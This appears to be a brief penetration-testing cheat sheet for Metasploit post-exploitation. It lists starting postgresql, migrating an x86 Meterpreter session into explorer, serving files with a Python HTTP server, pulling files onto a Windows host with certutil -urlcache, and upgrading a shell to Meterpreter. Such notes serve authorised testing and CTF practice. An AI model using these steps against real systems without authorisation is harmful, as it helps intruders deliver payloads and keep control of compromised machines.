# Metasploit start
```
Start the postgresql service before using metasploit
service postgresql start
```

# X86 Meterpreter session
```
If in sysinfo meterpreter command output, showa x86 meterpreter, migrate to x64 proccess is the system is x64
> pgrep explorer 
> migrate PID
```

# HTTP server
```
python -m SimpleHTTPServer 80
```

# CMD file download
```
certutil -urlcache -f URL/FILE DESTINATION_FILE
```

# Upgrade shell to meterpreter
```
sessions -u SESSION_NUMBER
```